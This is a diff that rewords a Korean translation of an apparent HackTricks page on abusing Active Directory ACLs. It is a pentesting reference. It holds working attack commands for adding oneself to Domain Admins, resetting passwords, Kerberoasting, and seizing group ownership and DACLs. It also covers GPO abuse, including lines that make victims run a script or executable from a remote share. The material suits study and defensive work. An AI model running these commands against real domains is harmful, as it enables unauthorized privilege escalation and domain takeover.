@@ -4,15 +4,15 @@
 
 **이 페이지는 주로** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **와** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**의 기술 요약입니다. 더 자세한 내용은 원본 기사를 확인하세요.**
 
-## BadSuccesor
+## BadSuccessor
 
 {{#ref}}
-BadSuccesor.md
+BadSuccessor.md
 {{#endref}}
 
 ## **사용자에 대한 GenericAll 권한**
 
-이 권한은 공격자에게 대상 사용자 계정에 대한 완전한 제어를 부여합니다. `Get-ObjectAcl` 명령을 사용하여 `GenericAll` 권한이 확인되면, 공격자는 다음을 수행할 수 있습니다:
+이 권한은 공격자에게 대상 사용자 계정에 대한 전체 제어를 부여합니다. `Get-ObjectAcl` 명령을 사용하여 `GenericAll` 권한이 확인되면, 공격자는 다음을 수행할 수 있습니다:
 
 - **대상의 비밀번호 변경**: `net user <username> <password> /domain`을 사용하여 공격자는 사용자의 비밀번호를 재설정할 수 있습니다.
 - **대상 Kerberoasting**: 사용자의 계정에 SPN을 할당하여 kerberoastable하게 만든 후, Rubeus와 targetedKerberoast.py를 사용하여 티켓 부여 티켓(TGT) 해시를 추출하고 크랙을 시도합니다.
@@ -27,9 +27,9 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **GenericAll 권한이 있는 그룹**
 
-이 권한은 공격자가 `Domain Admins`와 같은 그룹에 `GenericAll` 권한이 있을 경우 그룹 멤버십을 조작할 수 있게 해줍니다. `Get-NetGroup`을 사용하여 그룹의 고유 이름을 식별한 후, 공격자는:
+이 권한은 공격자가 `Domain Admins`와 같은 그룹에 대해 `GenericAll` 권한을 가지고 있을 경우 그룹 멤버십을 조작할 수 있게 해줍니다. `Get-NetGroup`을 사용하여 그룹의 고유 이름을 식별한 후, 공격자는:
 
-- **자신을 Domain Admins 그룹에 추가**: 이는 직접 명령어를 사용하거나 Active Directory 또는 PowerSploit와 같은 모듈을 사용하여 수행할 수 있습니다.
+- **자신을 Domain Admins 그룹에 추가**: 이는 직접 명령을 통해 또는 Active Directory나 PowerSploit와 같은 모듈을 사용하여 수행할 수 있습니다.
 ```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
@@ -44,9 +44,9 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 
 ## **WriteProperty on Group**
 
-사용자가 특정 그룹(예: `Domain Admins`)의 모든 객체에 대해 `WriteProperty` 권한을 가지고 있다면, 다음을 수행할 수 있습니다:
+사용자가 특정 그룹(예: `Domain Admins`)의 모든 객체에 대해 `WriteProperty` 권한을 가지고 있다면, 그들은:
 
-- **자신을 Domain Admins 그룹에 추가**: `net user`와 `Add-NetGroupUser` 명령을 결합하여 이 방법으로 도메인 내에서 권한 상승을 할 수 있습니다.
+- **자신을 Domain Admins 그룹에 추가**: `net user`와 `Add-NetGroupUser` 명령을 결합하여 이 방법을 통해 도메인 내에서 권한 상승을 달성할 수 있습니다.
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -78,7 +78,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **WriteOwner on Group**
 
-공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있다고 판단하면, 그들은 그룹의 소유권을 자신으로 변경할 수 있습니다. 이는 해당 그룹이 `Domain Admins`일 경우 특히 영향력이 큽니다. 소유권을 변경하면 그룹 속성과 구성원에 대한 더 넓은 제어가 가능해집니다. 이 과정은 `Get-ObjectAcl`을 통해 올바른 객체를 식별한 다음, `Set-DomainObjectOwner`를 사용하여 SID 또는 이름으로 소유자를 수정하는 것을 포함합니다.
+공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있다고 판단하면, 그들은 그룹의 소유권을 자신으로 변경할 수 있습니다. 이는 해당 그룹이 `Domain Admins`일 경우 특히 영향력이 크며, 소유권을 변경하면 그룹 속성과 구성원에 대한 더 넓은 제어가 가능합니다. 이 과정은 `Get-ObjectAcl`을 통해 올바른 객체를 식별한 다음, SID 또는 이름을 사용하여 `Set-DomainObjectOwner`를 통해 소유자를 수정하는 것을 포함합니다.
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -86,7 +86,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite on User**
 
-이 권한은 공격자가 사용자 속성을 수정할 수 있게 해줍니다. 구체적으로, `GenericWrite` 접근 권한을 통해 공격자는 사용자의 로그온 스크립트 경로를 변경하여 사용자가 로그온할 때 악성 스크립트를 실행할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 달성됩니다.
+이 권한은 공격자가 사용자 속성을 수정할 수 있게 해줍니다. 특히, `GenericWrite` 접근 권한을 통해 공격자는 사용자의 로그온 스크립트 경로를 변경하여 사용자가 로그온할 때 악성 스크립트를 실행할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 달성됩니다.
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
@@ -102,7 +102,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-AD 객체를 소유하고 그에 대한 `WriteDACL` 권한을 가지면 공격자는 자신에게 해당 객체에 대한 `GenericAll` 권한을 부여할 수 있습니다. 이는 ADSI 조작을 통해 이루어지며, 객체에 대한 완전한 제어와 그룹 구성원 자격을 수정할 수 있는 능력을 허용합니다. 그럼에도 불구하고 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용하여 이러한 권한을 악용하려고 할 때 제한이 존재합니다.
+AD 객체를 소유하고 그에 대한 `WriteDACL` 권한을 가지면 공격자는 자신에게 객체에 대한 `GenericAll` 권한을 부여할 수 있습니다. 이는 ADSI 조작을 통해 이루어지며, 객체에 대한 완전한 제어와 그룹 구성원 자격을 수정할 수 있는 능력을 허용합니다. 그럼에도 불구하고 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용하여 이러한 권한을 악용하려고 할 때 제한이 존재합니다.
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -128,13 +128,13 @@ DCSync 공격은 도메인에서 특정 복제 권한을 활용하여 도메인 
 
 **특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 적용된 정책을 보려면 `Get-DomainGPO`와 같은 명령을 사용할 수 있습니다.
 
-**적용된 정책이 있는 OU**: 특정 정책의 영향을 받는 조직 단위(OU)를 식별하기 위해 `Get-DomainOU`를 사용할 수 있습니다.
+**적용된 정책이 있는 OUs**: 특정 정책의 영향을 받는 조직 단위(OU)를 식별하기 위해 `Get-DomainOU`를 사용할 수 있습니다.
 
 또한 [**GPOHound**](https://github.com/cogiceo/GPOHound) 도구를 사용하여 GPO를 열거하고 문제를 찾을 수 있습니다.
 
 ### GPO 악용 - New-GPOImmediateTask
 
-잘못 구성된 GPO는 즉시 예약된 작업을 생성하여 코드를 실행하는 데 악용될 수 있습니다. 이는 영향을 받는 머신에서 로컬 관리자 그룹에 사용자를 추가하여 권한을 크게 상승시킬 수 있습니다:
+잘못 구성된 GPO는 코드를 실행하는 데 악용될 수 있으며, 예를 들어 즉시 예약된 작업을 생성하여 영향을 받는 머신의 로컬 관리자 그룹에 사용자를 추가할 수 있습니다. 이는 권한을 크게 상승시킵니다:
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
@@ -151,13 +151,13 @@ SharpGPOAbuse는 새로운 GPO를 생성할 필요 없이 기존 GPO를 악용�
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### 정책 업데이트 강제 실행
+### 정책 업데이트 강제 적용
 
-GPO 업데이트는 일반적으로 90분마다 발생합니다. 이 프로세스를 가속화하기 위해, 특히 변경 사항을 구현한 후에는 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉각적인 정책 업데이트를 강제할 수 있습니다. 이 명령은 GPO에 대한 수정 사항이 다음 자동 업데이트 주기를 기다리지 않고 적용되도록 보장합니다.
+GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 이 프로세스를 가속화하기 위해, 특히 변경 사항을 적용한 후에는 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉각적인 정책 업데이트를 강제할 수 있습니다. 이 명령은 GPO에 대한 수정 사항이 다음 자동 업데이트 주기를 기다리지 않고 적용되도록 보장합니다.
 
-### 내부 작동
+### 내부 작동 방식
 
-주어진 GPO의 예약된 작업을 검사하면, `Misconfigured Policy`와 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 수정하거나 권한을 상승시키기 위한 스크립트나 명령줄 도구를 통해 생성됩니다.
+주어진 GPO의 예약된 작업을 검사하면, `Misconfigured Policy`와 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 수정하거나 권한을 상승시키기 위한 스크립트 또는 명령줄 도구를 통해 생성됩니다.
 
 `New-GPOImmediateTask`에 의해 생성된 XML 구성 파일에 표시된 작업의 구조는 예약된 작업의 세부 사항을 설명합니다 - 실행할 명령과 그 트리거를 포함합니다. 이 파일은 GPO 내에서 예약된 작업이 어떻게 정의되고 관리되는지를 나타내며, 정책 집행의 일환으로 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.
 
